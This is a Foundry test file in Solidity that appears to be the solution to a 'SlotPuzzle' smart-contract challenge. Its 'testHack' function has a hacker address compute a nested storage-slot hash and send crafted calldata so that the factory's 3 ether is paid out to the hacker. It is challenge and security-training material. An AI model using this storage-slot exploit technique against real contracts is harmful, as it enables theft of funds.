// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {SlotPuzzle} from "src/SlotPuzzle.sol";
import {SlotPuzzleFactory} from "src/SlotPuzzleFactory.sol";
import {Parameters, Recipients} from "src/interface/ISlotPuzzleFactory.sol";

contract SlotPuzzleTest is Test {
    SlotPuzzle public slotPuzzle;
    SlotPuzzleFactory public slotPuzzleFactory;
    Recipients[] recArray;
    address hacker;
    bytes32 slotMapping;
    bytes32 dataSlot;
    // required this be append to the actual data slot
    bytes32 toPass =
        0x0000000000000000000000000000000000000000000000000000000000000124;

    function setUp() public {
        slotPuzzleFactory = new SlotPuzzleFactory{value: 3 ether}();
        hacker = makeAddr("hacker");
    }

    function testHack() public {
        vm.startPrank(hacker, hacker);
        assertEq(
            address(slotPuzzleFactory).balance,
            3 ether,
            "weth contract should have 3 ether"
        );

        //hack time
        slotMapping = keccak256(
            abi.encodePacked(
                uint256(
                    uint160(
                        address(
                            uint160(
                                uint256(blockhash(block.number - block.basefee))
                            )
                        )
                    )
                ),
                keccak256(
                    abi.encodePacked(
                        block.chainid,
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    uint256(uint160(address(block.coinbase))),
                                    keccak256(
                                        abi.encodePacked(
                                            block.prevrandao,
                                            uint(
                                                keccak256(
                                                    abi.encodePacked(
                                                        uint256(
                                                            uint160(
                                                                address(
                                                                    slotPuzzleFactory
                                                                )
                                                            )
                                                        ),
                                                        keccak256(
                                                            abi.encodePacked(
                                                                block.timestamp,
                                                                uint(
                                                                    keccak256(
                                                                        abi
                                                                            .encodePacked(
                                                                                block
                                                                                    .number,
                                                                                keccak256(
                                                                                    abi
                                                                                        .encodePacked(
                                                                                            uint256(
                                                                                                uint160(
                                                                                                    hacker
                                                                                                )
                                                                                            ),
                                                                                            uint256(
                                                                                                1
                                                                                            )
                                                                                        )
                                                                                )
                                                                            )
                                                                    )
                                                                ) + 1
                                                            )
                                                        )
                                                    )
                                                )
                                            ) + 1
                                        )
                                    )
                                )
                            )
                        ) + 1
                    )
                )
            )
        );
        dataSlot = keccak256(abi.encodePacked(slotMapping));

        Recipients memory rec1 = Recipients(hacker, 1 ether);

        recArray.push(rec1);
        recArray.push(rec1);
        recArray.push(rec1);
        // a little bit of math trick to point data to intended slot
        Parameters memory params = Parameters(
            3,
            452,
            recArray,
            abi.encodePacked(dataSlot, toPass)
        );

        slotPuzzleFactory.deploy(params);

        assertEq(
            address(slotPuzzleFactory).balance,
            0,
            "weth contract should have 0 ether"
        );
        assertEq(
            address(hacker).balance,
            3 ether,
            "hacker should have 3 ether"
        );

        vm.stopPrank();
    }
}
